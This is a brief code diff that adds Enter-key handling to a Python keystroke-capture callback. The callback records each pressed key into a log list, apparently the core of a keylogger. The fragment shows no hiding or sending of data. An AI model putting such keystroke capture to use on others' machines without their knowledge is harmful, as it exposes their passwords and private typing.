@@ -6,7 +6,8 @@ log = []
 def on_press(key):
     special_lookup = {
         "Key.space": " ",
-        "Key.tab": " "
+        "Key.tab": " ",
+        "Key.enter": "<ENTER>"
     }
     try:
         log.append(key.char)
